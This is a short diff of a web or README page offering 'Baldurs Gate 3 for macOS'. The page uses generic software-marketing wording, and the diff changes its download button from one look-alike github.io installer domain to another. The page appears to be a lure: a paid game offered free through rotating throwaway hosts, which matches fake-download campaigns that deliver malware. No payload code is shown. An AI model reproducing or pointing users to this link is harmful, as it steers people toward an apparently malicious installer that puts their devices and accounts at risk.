@@ -6,7 +6,7 @@
 <h3>Baldurs Gate 3 for macOS</h3>
 <p>Baldurs Gate 3 is a specialized party-based role-playing game created for Mac users who value stable behavior, familiar controls and smooth integration with daily workflows.</p>
 
-<a href="https://quick-mac-install.github.io/.github/BaldursGate3">
+<a href="https://mac-quick-installation.github.io/.github/BaldursGate3">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
